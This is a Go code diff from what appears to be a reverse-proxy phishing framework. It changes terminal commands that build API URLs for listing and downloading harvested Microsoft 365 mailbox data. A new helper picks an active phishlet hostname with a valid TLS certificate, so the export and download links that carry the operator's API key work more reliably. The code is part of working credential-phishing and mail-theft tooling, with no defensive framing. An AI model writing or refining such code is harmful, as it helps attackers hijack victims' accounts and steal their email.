@@ -4252,21 +4252,18 @@ func (t *Terminal) handleMailbox(args []string) {
 			log.Success("[mailbox] Removed account: %s", acc.Email)
 		}
 	case "url":
-		phishDomain := t.cfg.GetBaseDomain()
-		if phishDomain == "" {
-			phishDomain = "<your-domain>"
-		}
+		apiHost := t.getAPIHost()
 		apiKey := t.p.tokenFeed.GetAPIKey()
-		log.Info("[mailbox] API URL: https://%s/api/v1/mailbox?key=%s", phishDomain, apiKey)
+		log.Info("[mailbox] API URL: https://%s/api/v1/mailbox?key=%s", apiHost, apiKey)
 	case "download":
-		phishDomain := t.cfg.GetBaseDomain()
-		if phishDomain == "" {
-			log.Error("[mailbox] Please configure your domain first: config domain <your-domain>")
+		apiHost := t.getAPIHost()
+		if apiHost == "<your-domain>" {
+			log.Error("[mailbox] Please configure your domain and enable a phishlet first")
 			return
 		}
 		apiKey := t.p.tokenFeed.GetAPIKey()
-		downloadURL := fmt.Sprintf("https://%s/api/v1/mailbox/download?key=%s", phishDomain, apiKey)
-		jsonURL := fmt.Sprintf("https://%s/api/v1/mailbox?key=%s&action=export", phishDomain, apiKey)
+		downloadURL := fmt.Sprintf("https://%s/api/v1/mailbox/download?key=%s", apiHost, apiKey)
+		jsonURL := fmt.Sprintf("https://%s/api/v1/mailbox?key=%s&action=export", apiHost, apiKey)
 		log.Info("[mailbox] ════════════════════════════════════════════════════════════")
 		log.Info("[mailbox] M365-Mail Download Package")
 		log.Info("[mailbox] ════════════════════════════════════════════════════════════")
@@ -4307,4 +4304,18 @@ func (t *Terminal) filterInput(r rune) (rune, bool) {
 		return r, false
 	}
 	return r, true
+}
+
+// getAPIHost returns the best hostname to use for API URLs.
+// Prefers an active phishlet hostname (which has a valid TLS cert) over the bare base domain.
+func (t *Terminal) getAPIHost() string {
+	hosts := t.cfg.GetActiveHostnames("")
+	if len(hosts) > 0 {
+		return hosts[0]
+	}
+	baseDomain := t.cfg.GetBaseDomain()
+	if baseDomain != "" {
+		return baseDomain
+	}
+	return "<your-domain>"
 }
